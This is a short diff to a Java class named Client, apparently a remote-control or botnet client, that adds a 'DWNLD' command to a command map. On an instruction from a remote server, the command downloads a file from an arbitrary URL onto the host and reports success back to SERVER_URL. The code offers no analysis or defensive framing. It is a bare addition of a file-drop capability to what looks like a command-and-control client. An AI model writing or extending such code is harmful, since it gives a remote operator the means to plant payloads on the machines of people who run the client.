@@ -85,6 +85,38 @@ public class Client extends Thread {
 			
 		});
 		
+		// Download a file
+		commands.put("DWNLD", new Command(){
+
+			@Override
+			public String exec(String[] args) {
+				// args[0] url
+				// args[1] filename
+								
+				try {
+					HTTPRequest.download(args[0], args[1]);
+					HTTPRequest.sendAsync(
+							SERVER_URL,
+							"EXEC_OUT File correctly downloaded.",
+							new Callback(){
+
+						@Override
+						public void run(String response) {
+							// TODO Auto-generated method stub
+						}
+						
+					});
+					
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				
+				return null;
+			}
+			
+		});
+		
 		// ADD COMMANDS HERE
 	}
 	
